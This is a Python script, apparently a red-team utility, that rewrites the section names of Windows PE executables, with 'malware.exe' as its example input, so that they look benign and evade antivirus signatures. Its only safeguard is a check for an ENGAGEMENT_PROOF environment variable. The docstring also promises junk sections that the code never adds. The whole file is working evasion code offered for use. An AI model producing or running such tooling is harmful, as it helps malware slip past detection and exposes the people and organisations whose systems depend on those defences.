#!/usr/bin/env python3
"""
pe_section_scrambler.py - Scramble PE section names and add junk sections to evade AV signatures.

Usage:
    python scripts/pe_section_scrambler.py --input malware.exe --output patched.exe
    python scripts/pe_section_scrambler.py --input malware.exe --analyze

Engagement proof: set ENGAGEMENT_PROOF env var.
"""
import argparse
import os
import random
import struct
import string
import sys

ENGAGEMENT_PROOF = os.environ.get("ENGAGEMENT_PROOF", "")

COMMON_BENIGN_SECTIONS = [b".text", b".rdata", b".data", b".pdata", b".rsrc", b".reloc", b".tls", b".xdata"]
JUNK_SECTIONS = [b".teleme", b".mrdata", b".comsig", b".rxdata", b".telem2", b".appdat"]


def require_proof():
    if not ENGAGEMENT_PROOF:
        print("[!] Set ENGAGEMENT_PROOF"); sys.exit(1)


def parse_pe(data: bytes):
    e_lfanew = struct.unpack_from("<I", data, 0x3C)[0]
    sig = data[e_lfanew:e_lfanew+4]
    if sig != b"PE\x00\x00":
        raise ValueError("Not a valid PE file")
    machine = struct.unpack_from("<H", data, e_lfanew + 4)[0]
    num_sections = struct.unpack_from("<H", data, e_lfanew + 6)[0]
    opt_size = struct.unpack_from("<H", data, e_lfanew + 20)[0]
    sec_table_off = e_lfanew + 24 + opt_size
    sections = []
    for i in range(num_sections):
        off = sec_table_off + i * 40
        name = data[off:off+8]
        vsize  = struct.unpack_from("<I", data, off+8)[0]
        vaddr  = struct.unpack_from("<I", data, off+12)[0]
        rawsz  = struct.unpack_from("<I", data, off+16)[0]
        rawoff = struct.unpack_from("<I", data, off+20)[0]
        chars  = struct.unpack_from("<I", data, off+36)[0]
        sections.append({"off": off, "name": name, "vsize": vsize, "vaddr": vaddr,
                          "rawsz": rawsz, "rawoff": rawoff, "chars": chars})
    return e_lfanew, num_sections, sec_table_off, sections


def analyze(data: bytes):
    try:
        e_lfanew, num_sec, _, sections = parse_pe(data)
    except ValueError as e:
        print(f"[-] {e}"); return
    print(f"[*] PE sections ({num_sec}):")
    for s in sections:
        name = s["name"].rstrip(b"\x00").decode(errors="replace")
        print(f"  {name:<12} VA=0x{s['vaddr']:08X}  RawSz=0x{s['rawsz']:08X}  "
              f"Chars=0x{s['chars']:08X}  RawOff=0x{s['rawoff']:08X}")


def scramble_section_names(data: bytes) -> bytes:
    """Rename PE section names to benign-looking alternatives."""
    require_proof()
    data = bytearray(data)
    try:
        _, _, _, sections = parse_pe(bytes(data))
    except ValueError as e:
        print(f"[-] {e}"); return bytes(data)

    used = list(COMMON_BENIGN_SECTIONS)
    random.shuffle(used)
    for i, sec in enumerate(sections):
        new_name = (used[i % len(used)] + b"\x00" * 8)[:8]
        data[sec["off"]:sec["off"]+8] = new_name
        old = sec["name"].rstrip(b"\x00").decode(errors="replace")
        print(f"[+] Renamed '{old}' -> '{new_name.rstrip(chr(0).encode()).decode()}'")

    return bytes(data)


def main():
    p = argparse.ArgumentParser(description="PE section scrambler (authorized use only)")
    p.add_argument("--input", required=True)
    p.add_argument("--output")
    p.add_argument("--analyze", action="store_true")
    args = p.parse_args()

    if not os.path.exists(args.input):
        print(f"[-] Not found: {args.input}"); sys.exit(1)

    data = open(args.input, "rb").read()

    if args.analyze:
        analyze(data); return

    result = scramble_section_names(data)
    out = args.output or args.input.replace(".exe", "_patched.exe")
    open(out, "wb").write(result)
    print(f"[+] Written: {out} ({os.path.getsize(out):,} bytes)")


if __name__ == "__main__":
    main()
